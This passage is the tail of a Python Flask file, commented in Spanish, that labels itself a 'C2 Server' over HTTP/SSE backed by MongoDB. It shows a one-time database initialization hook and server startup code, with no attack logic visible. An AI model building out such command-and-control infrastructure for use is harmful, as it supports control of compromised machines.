    except Exception as e:
        logger.error(f"Database initialization failed: {e}")
        return False

# Variable de control para inicialización única
_db_initialized = False

@app.before_request
def ensure_db_initialized():
    """
    Middleware que garantiza que la BD está inicializada antes del primer request.
    """
    global _db_initialized
    
    if not _db_initialized:
        if initialize_database():
            _db_initialized = True
        else:
            logger.critical("Cannot proceed without database initialization")
            return jsonify({'error': 'Database initialization failed'}), 500


if __name__ == '__main__':
    logger.info(f"Starting C2 Server on port {C2_PORT} (HTTP/SSE)")
    logger.info(f"MongoDB URI: {MONGO_URI}")
    logger.info(f"C2 Server v2.0.0-sse (HTTP/SSE)")
    
    # La inicialización se ejecutará en el primer request (before_request hook)
    logger.info("Initialization will occur on first request...")
    
    app.run(
        host='0.0.0.0',
        port=C2_PORT,
        threaded=True,
        debug=False
    )
